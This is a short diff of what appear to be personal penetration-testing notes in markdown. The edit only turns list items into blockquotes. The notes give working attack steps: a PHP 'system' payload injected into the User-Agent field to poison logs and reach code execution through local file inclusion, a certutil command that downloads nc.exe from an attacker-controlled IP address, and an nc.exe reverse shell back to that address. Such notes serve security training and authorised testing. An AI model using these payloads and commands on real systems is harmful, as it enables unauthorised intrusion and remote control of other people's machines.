@@ -117,13 +117,13 @@ test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j
 > 1. and file will be downloaded. 
 
 ##### RCE via PHP system on Windows server - LFI - Log Poision
-1. Use "seclist ---> LFI ---> Windows file" for fuzzing/testing LFI
-1. To test whether you have you can do RCE, try adding this to UserAgent field--- <?php system('dir');?>
-1. Try loading the log file and you should see files listed. 
+> 1. Use "seclist ---> LFI ---> Windows file" for fuzzing/testing LFI
+> 1. To test whether you have you can do RCE, try adding this to UserAgent field--- <?php system('dir');?>
+> 1. Try loading the log file and you should see files listed. 
 
 ##### Shell on Windows via nc.exe
-1. Dowload nc.exe --- certutil.exe -urlcache -split -f http://192.168.49.202:445/nc.exe
-1. Get reverse shell --- nc.exe 192.168.49.202 4443 -e cmd
+> 1. Dowload nc.exe --- certutil.exe -urlcache -split -f http://192.168.49.202:445/nc.exe
+> 1. Get reverse shell --- nc.exe 192.168.49.202 4443 -e cmd
 
 
 #### PrivESC Methodology for Windows
